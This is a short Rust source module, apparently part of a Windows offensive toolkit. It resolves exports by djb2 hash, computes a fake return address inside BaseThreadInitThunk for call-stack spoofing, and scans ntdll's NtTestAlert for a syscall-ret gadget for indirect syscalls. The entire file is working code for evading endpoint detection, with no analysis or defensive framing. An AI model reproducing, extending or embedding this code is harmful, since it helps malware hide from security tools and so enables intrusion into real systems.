use std::ffi::c_void;
use crate::core::peb::get_export_address_by_hash;
use crate::utils::hash::dbj2_hash;

pub unsafe fn find_legit_return_address(module_base: *mut c_void) -> Option<usize> {
    // Hash for "BaseThreadInitThunk"
    let func_hash = dbj2_hash("BaseThreadInitThunk");
    if let Some(addr) = get_export_address_by_hash(module_base, func_hash) {
        // Return an offset within the function that looks like a call site (e.g., after a sub rsp, XX)
        return Some(addr as usize + 0x14);
    }
    None
}

pub unsafe fn find_syscall_gadget(ntdll_base: *mut c_void) -> Option<usize> {
    let func_hash = dbj2_hash("NtTestAlert");
    if let Some(addr) = get_export_address_by_hash(ntdll_base, func_hash) {
        let mut ptr = addr as *const u8;
        for _ in 0..1000 {
            if *ptr == 0x0f && *ptr.add(1) == 0x05 && *ptr.add(2) == 0xc3 {
                return Some(ptr as usize);
            }
            ptr = ptr.add(1);
        }
    }
    None
}
